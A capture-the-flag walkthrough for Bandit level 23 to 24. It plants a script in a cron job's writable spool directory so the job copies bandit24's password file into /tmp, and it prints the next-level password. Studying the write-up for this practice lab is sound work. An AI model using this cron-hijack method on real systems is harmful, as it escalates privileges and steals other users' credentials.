## Bandit Level 23 → Level 24

### 🎯 Objective
Gain the password for bandit24 by exploiting the cron job running as bandit24.

### 🔑 Credentials Provided
Username: bandit23  
Password: Obtained from previous level  

### 🔍 Method of Solve
There is a cron job running as bandit24 which executes scripts from `/var/spool/bandit24/`.  
By placing our own malicious script inside that directory, we can force the cron job to execute it and dump the password of bandit24 to a world-readable file.

### 🧪 Commands Used
- cd /etc/cron.d  
- cat cronjob_bandit24  
- echo 'cat /etc/bandit_pass/bandit24 > /tmp/ak.txt' > /var/spool/bandit24/foo/ak.sh  
- chmod +x /var/spool/bandit24/foo/ak.sh  
- cat /tmp/ak.txt

### 🧠 Explanation
After checking `/etc/cron.d/`, we discovered `cronjob_bandit24`, which shows a script that executes everything inside `/var/spool/bandit24/foo/`.  
We exploit this by inserting our own script (`ak.sh`) which reads the bandit24 password and writes it into `/tmp/ak.txt`.  
Setting executable permission makes sure cron can run it.  
Once cron executes, the password becomes available inside `/tmp/ak.txt`, which we simply read.

### 🔐 Concept Learned
This level teaches about Linux cron job exploitation and privilege escalation using writable cron execution paths.  
If a higher-privileged cron job runs user-controlled scripts, it can be abused to read protected files such as passwords.

### 🔑 Next Level Password
g8bKRRCsshuZXI0tUR6Yp0FjIzbF3G8
